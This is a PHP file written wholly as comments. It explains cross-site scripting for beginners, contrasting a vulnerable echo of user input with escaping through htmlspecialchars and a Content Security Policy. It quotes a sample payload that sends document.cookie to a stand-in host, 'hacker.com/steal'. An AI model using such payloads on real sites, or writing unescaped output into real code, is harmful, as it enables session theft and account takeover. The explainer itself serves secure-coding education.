<?php
// XSS (Cross-Site Scripting) is a security attack where hackers inject malicious scripts (usually JavaScript) into trusted websites or applications to execute code in users' browsers.

// Simple Explanation
// Imagine a website that displays user comments. Normally:

// text
// User says: "Hello, I love this site!"
// But a hacker submits:

// text
// User says: "<script>stealCookies()</script>"
// What Attacker Can Do with XSS
// Attack	                      Impact
// Steal session cookies	Hijack user accounts without password 
// Redirect users	        Send victims to fake phishing sites 
// Modify page content	    Change prices, display fake messages 
// Capture keystrokes	    Record passwords as user types 
// Install malware	        Download viruses onto user's computer 
// Take over social media	Post fake messages from victim's account 

// How XSS Works
// An XSS attack requires two things:

// 1.Website accepts user input (comments, search, forms)

// 2. Website displays input without sanitizing (doesn't remove dangerous code)

// EX.
// Hacker inputs: <img src=x onerror="alert('XSS')">
// Website displays it → Browser executes the script

// Types of XSS
// Type	       How It Works
// 1.Stored XSS	Malicious script saved in database (comments, posts) - attacks every visitor
// 2.Reflected XSS	Script returned immediately in response (search results, error messages)
// 3.DOM-based XSS	Attack happens in browser's JavaScript (not server-side)

// Example: PHP Vulnerable Code
// php
// // ❌ VULNERABLE to XSS

// $username = $_GET['name'];
// echo "<h1>Hello, " . $username . "</h1>";  // User input directly displayed
// Hacker input: name=<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>

// Result: Every user visiting that page sends their cookies to the hacker.

// How to Prevent XSS
// ✅ 1. Escape Output (HTML Encoding)
// php
// // ✅ SECURE
// $username = $_GET['name'];
// echo "<h1>Hello, " . htmlspecialchars($username, ENT_QUOTES) . "</h1>";
// htmlspecialchars() converts < to &lt;, > to &gt; - scripts become harmless text.

// ✅ 2. Use Content Security Policy (CSP)
// xml
// <head>
//   <meta http-equiv="Content-Security-Policy" content="script-src 'self';">
// </head>

//  XSS = hacker puts malicious JavaScript into your website, and when users visit, their browser runs the attacker's code. Always escape user output with htmlspecialchars() to prevent it!
